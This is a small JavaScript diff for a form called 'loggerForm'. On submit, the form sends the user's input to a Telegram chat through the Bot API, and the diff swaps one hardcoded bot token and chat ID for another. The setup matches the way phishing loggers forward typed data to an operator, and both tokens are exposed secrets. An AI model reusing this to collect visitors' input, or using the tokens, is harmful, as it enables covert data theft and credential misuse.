@@ -4,13 +4,13 @@ document.getElementById("loggerForm").addEventListener("submit", function(event)
     var data = document.getElementById("data").value; // Get the data from the input field
   
     // Send the data to the Telegram bot using the fetch API
-    fetch("https://api.telegram.org/bot7690340562:AAEpyw0by4zP40mXIH9K_XTsTeJROFP1ZPQ/sendMessage", {
+    fetch("https://api.telegram.org/bot8365529193:AAF9a1IuZyfdFkkvj5NKkbqrCpPyltSOhSQ/sendMessage", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        chat_id: "7313667208",
+        chat_id: "8284681571",
         text: data
       })
     })
@@ -25,3 +25,4 @@ document.getElementById("loggerForm").addEventListener("submit", function(event)
       console.error("An error occurred:", error);
     });
   });
+
